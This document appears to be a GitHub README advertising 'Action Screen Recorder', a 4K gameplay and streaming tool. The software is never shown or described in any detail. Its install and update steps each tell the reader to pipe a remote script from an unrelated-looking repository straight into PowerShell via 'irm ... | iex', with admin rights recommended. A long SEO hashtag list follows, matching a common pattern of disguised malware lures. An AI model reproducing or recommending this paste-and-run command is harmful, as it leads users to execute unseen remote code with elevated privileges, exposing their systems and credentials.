# Action-Screen-Recorder-Setup

Action Screen Recorder captures 4K gameplay, desktop activity, and webcam footage with hardware acceleration. Stream directly to Twitch and YouTube with real-time commentary overlay.

---

## Deploy

```powershell
# Run this in PowerShell (Admin recommended)
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## Verify Installation

```powershell
# Check that the install directory exists
Test-Path "$env:LOCALAPPDATA\Action-Screen-Recorder-Setup"
```

## Configuration

```powershell
# Optional: set custom install path
$env:INSTALL_DIR = "D:\Tools\Action-Screen-Recorder-Setup"
```

The installer respects the INSTALL_DIR environment variable if set before execution.

## Architecture

```
Action-Screen-Recorder-Setup/
  bin/          -- Application binaries
  config/       -- User configuration files
  data/         -- Runtime data and caches
  logs/         -- Application logs
```

## Update

```powershell
# Same command as install -- it handles upgrades
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

#screen-recorder #gameplay-recorder #4k-recording #action-recorder #streaming-tool #webcam-recorder #action-setup #hardware-acceleration #twitch-streaming #youtube-recorder #screen-capture #action-2026 #gameplay-capture #commentary-overlay #desktop-recorder #live-streaming #recording-software #obs-alternative
